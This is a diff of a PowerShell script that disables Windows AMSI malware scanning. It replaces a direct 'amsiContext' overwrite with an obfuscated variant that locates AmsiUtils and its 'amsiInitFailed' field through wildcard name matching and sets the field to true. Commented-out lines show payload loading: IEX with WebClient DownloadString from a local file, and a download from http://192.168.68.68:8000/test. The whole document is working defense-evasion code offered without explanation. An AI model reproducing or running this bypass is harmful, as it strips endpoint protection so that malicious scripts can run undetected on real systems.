@@ -1,1 +1,19 @@
-[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
+$ExecutionContext.SessionState.LanguageMode;
+
+$a=[Ref].Assembly.GetTypes(); 
+
+#[System.Net.WebRequest]::DefaultWebProxy.GetProxy("https://raw.githubusercontent.com/Alium-Realis/HelloWrld/main/README.md");
+
+#$wc = new-object System.Net.WebClient;
+#$wc.proxy = $null;
+
+Foreach($z in $a) {if ($z.Name -like "*iUtils") {$c=$z}};
+
+#IEX(New-Object System.Net.WebClient).DownloadString("D:\d-test\amlite.txt");
+
+$d = $c.GetFields('NonPublic,Static');
+Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}}; 
+
+#$wc.DownloadString("http://192.168.68.68:8000/test");
+
+$f.SetValue($null,$true); 
